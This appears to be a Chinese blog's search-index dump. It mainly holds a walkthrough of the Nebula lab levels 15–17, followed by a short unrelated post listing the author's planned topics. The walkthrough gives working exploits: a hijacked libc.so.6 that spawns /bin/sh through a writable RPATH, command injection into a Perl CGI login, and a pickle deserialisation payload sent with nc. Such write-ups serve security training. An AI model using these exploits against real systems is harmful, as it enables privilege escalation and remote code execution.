/home/flag15. WP直接strace，得出flag15依赖于lib.so.612345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061strace ./flag15 execve(&quot;./flag15&quot;, [&quot;./flag15&quot;], [/* 20 vars */]) = 0 brk(0) = 0x9e8f000 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory) mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7783000 access(&quot;/etc/ld.so.preload&quot;, R_OK) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbf8c7444) = -1 ENOENT (No such file or directory) open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(&quot;/var/tmp/flag15&quot;, &#123;st_mode=S_IFDIR|0775, st_size=4096, ...&#125;) = 0 open(&quot;/etc/ld.so.cache&quot;, O_RDONLY) = 3 fstat64(3, &#123;st_mode=S_IFREG|0644, st_size=19771, ...&#125;) = 0 mmap2(NULL, 19771, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb777e000 close(3) = 0 access(&quot;/etc/ld.so.nohwcap&quot;, F_OK) = -1 ENOENT (No such file or directory) open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3 read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512 fstat64(3, &#123;st_mode=S_IFREG|0755, st_size=1544392, ...&#125;) = 0 mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xc19000 mmap2(0xd8f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd8f000 mmap2(0xd92000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd92000 close(3) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb777d000 set_thread_area(&#123;entry_number:-1 -&gt; 6, base_addr:0xb777d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1&#125;) = 0 mprotect(0xd8f000, 8192, PROT_READ) = 0 mprotect(0x8049000, 4096, PROT_READ) = 0 mprotect(0xfdf000, 4096, PROT_READ) = 0 munmap(0xb777e000, 19771) = 0 fstat64(1, &#123;st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...&#125;) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7782000 write(1, &quot;strace it!\n&quot;, 11strace it! ) = 11exit_group(11) = ? 通过objdump -p flag15命令我们得知/flag15在/var/tmp/flag15寻找libc.so.6，找不到再向其他系统默认的位置寻找 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647flag15: file format elf32-i386Program Header: PHDR off 0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2 filesz 0x00000120 memsz 0x00000120 flags r-x INTERP off 0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0 filesz 0x00000013 memsz 0x00000013 flags r-- LOAD off 0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12 filesz 0x000005d4 memsz 0x000005d4 flags r-x LOAD off 0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12 filesz 0x00000108 memsz 0x00000110 flags rw- DYNAMIC off 0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2 filesz 0x000000d0 memsz 0x000000d0 flags rw- NOTE off 0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2 filesz 0x00000044 memsz 0x00000044 flags r--EH_FRAME off 0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2 filesz 0x00000034 memsz 0x00000034 flags r-- STACK off 0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2 filesz 0x00000000 memsz 0x00000000 flags rw- RELRO off 0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0 filesz 0x000000f4 memsz 0x000000f4 flags r--Dynamic Section: NEEDED libc.so.6 RPATH /var/tmp/flag15 INIT 0x080482c0 FINI 0x080484ac GNU_HASH 0x080481ac STRTAB 0x0804821c SYMTAB 0x080481cc STRSZ 0x0000005a SYMENT 0x00000010 DEBUG 0x00000000 PLTGOT 0x08049ff4 PLTRELSZ 0x00000018 PLTREL 0x00000011 JMPREL 0x080482a8 REL 0x080482a0 RELSZ 0x00000008 RELENT 0x00000008 VERNEED 0x08048280 VERNEEDNUM 0x00000001 VERSYM 0x08048276Version References: required from libc.so.6: 0x0d696910 0x00 02 GLIBC_2.0 另外，我们输入 objdump -R flag15，了解到它调用节几个函数，查下资料，我看是个WP，__libc_start_main是我们的目标。12345678flag15: file format elf32-i386DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ff0 R_386_GLOB_DAT __gmon_start__ 0804a000 R_386_JUMP_SLOT puts 0804a004 R_386_JUMP_SLOT __gmon_start__ 0804a008 R_386_JUMP_SLOT __libc_start_main 那我们的工作就转向了 /var/tmp/flag15，我们写个简单的pwn12345678#include &lt;stdlib.h&gt;int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) &#123; system(&quot;/bin/sh&quot;);&#125;int main ()&#123; return 0;&#125; 编译gcc -shared -fPIC -o libc.so.6 pwn15.c运行flag15，结果如下 /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference 我们少了一个 __cxa_finalize函数，接着编译，运行123void __cxa_finalize (void *d) &#123; return;&#125; /home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference 这就是之前的需要GLIBC_2.0版本我们新建一个version文件，内容为GLIBC_2.0 { };，接着编译gcc -shared -fPIC -o libc.so.6 pwn15.c -Wl,--version-script=version，运行flag15，结果如下 /home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference 看WP需要静态编译，于是编译命令边为gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 pwn15.c成功进入shell，直接getflag level16AboutThere is a perl script running on port 1616.To do this level, log in as the level16 account with the password level16. Files for this level can be found in /home/flag16. Source12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env perluse CGI qw&#123;param&#125;;print &quot;Content-type: text/html\n\n&quot;;sub login &#123; $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\s.*//; # strip everything after a space @output = `egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`; foreach $line (@output) &#123; ($usr, $pw) = split(/:/, $line); if($pw =~ $password) &#123; return 1; &#125; &#125; return 0;&#125;sub htmlz &#123; print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;); if($_[0] == 1) &#123; print(&quot;Your login was accepted&lt;br/&gt;&quot;); &#125; else &#123; print(&quot;Your login failed&lt;br/&gt;&quot;); &#125; print(&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;);&#125;htmlz(login(param(&quot;username&quot;), param(&quot;password&quot;))); 又是一个perl这题的考点主要站绕过两个限制 大小写限制 Case modification 限制 大小写验证可以通过大写名字的shell脚本绕过 需要把/home/flag16的环境变为/tmp的环境中，我们用到了shell通配符/*/xxx先写一个python方便验证12345678#!/usr/bin/pythonimport urllib2from urllib import quotehost = &apos;127.0.0.1:1616&apos;uri = &apos;http://&#123;&#125;/index.cgi?username=&#123;&#125;&amp;password=&#123;&#125;&apos;.format(host, quote(&apos;$(/*/CODE.SH)&apos;, safe=&apos;&apos;), &apos;&apos;)request = urllib2.urlopen(uri)# should take at least 5 seconds if the code is executedprint request.read() 还有一个验证的shell:CODE.SH12#!/bin/bashsleep 5 运行时等待了5秒证明成功了我们让程序自己调用getflag12#!/bin/bashgetflag &gt; /tmp/got level17AboutThere is a python script listening on port 10007 that contains a vulnerability.To do this level, log in as the level17 account with the password level17. Files for this level can be found in /home/flag17. Source1234567891011121314151617181920212223242526272829#!/usr/bin/pythonimport osimport pickleimport timeimport socketimport signalsignal.signal(signal.SIGCHLD, signal.SIG_IGN)def server(skt): line = skt.recv(1024) obj = pickle.loads(line) for i in obj: clnt.send("why did you send me " + i + "?\n")skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)skt.bind(('0.0.0.0', 10007))skt.listen(10)while True: clnt, addr = skt.accept() if(os.fork() == 0): clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1])) server(clnt) exit(1) WP这题利用了python中pickle反序列化中的代码执行漏洞这里我们做个实验12345678910111213import pickledef test1(): by = 'lu4nx' f = open('./test1','w') pickle.dump(by,f)def test2(): try: f = open('./test1') except: test1(); f = open('./test1') a = pickle.load(f) print a 执行test1，会在py目录下生成一个test1文件文件内容是 S’lu4nx’p0. S’字符串’，源码中的解释是：Push a Python string object。这里我们理解成生成一个字符串即可。 同样，p操作符的解释是：Store the stack top into the memo. The stack is not popped。 接着我们可以利用前人已经构造好的命令执行函数1234cossystem(S&apos;**命令**&apos;tR. 导入模块os：cos 调用函数system 存储参数 -&gt; pop值和MARK对象（执行） 如1234cossystem(S&apos;pwd&apos;tR. 输出为 /tmp0 明显的命令执行，那么我们构造输入存在/tmp/exp中123cossystem(S&apos;getflag&gt;/tmp/flag17&apos;tR. 运行命令cat /tmp/exp | nc 127.0.0.1 10007连接后敲击回车，Ctrl+C强制中断。就能获取到flag]]></content>
      <tags>
        <tag>Exercises</tag>
        <tag>Exploit Exercises</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我要抄什么]]></title>
    <url>%2F2018%2F11%2F28%2F%E6%88%91%E8%A6%81%E6%8A%84%E4%BB%80%E4%B9%88%2F</url>
    <content type="text"><![CDATA[1. 机器学习内容 秋大哥的机器学习课，秋大哥是太监王者，毫无疑问会断更，其博客为hf193。 翔翔会发经典作品么，没有，关注了那么多年没看到，都是些抄袭作品，其git为xiang2017。 2. 框架知识 摘抄些大牛的基础知识 一些使用中的框架内容介绍 3. 网络安全内容，包括一些POC 好不容易想起来写的一些随笔 POC，web工具 4. 童姥爷的大作会有么？就会说不打XX滚得人]]></content>
      <tags>
        <tag>summary</tag>
        <tag>editting</tag>
      </tags>
  </entry>
</search>
